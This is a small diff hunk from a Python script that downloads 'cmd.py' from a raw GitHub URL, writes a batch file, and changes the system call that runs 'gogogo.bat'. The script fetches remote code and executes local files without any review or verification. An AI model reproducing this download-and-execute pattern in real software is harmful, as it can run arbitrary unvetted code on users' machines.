@@ -6,4 +6,4 @@ with open("gogogo.bat",'x') as b:
 with open("cmd.py",'x') as b:
     b.write(httpx.get("https://raw.githubusercontent.com/TerenceP1/trigger/refs/heads/main/cmd.py").text)
 
-os.system("gogogo")
+os.system(".\gogogo.bat")
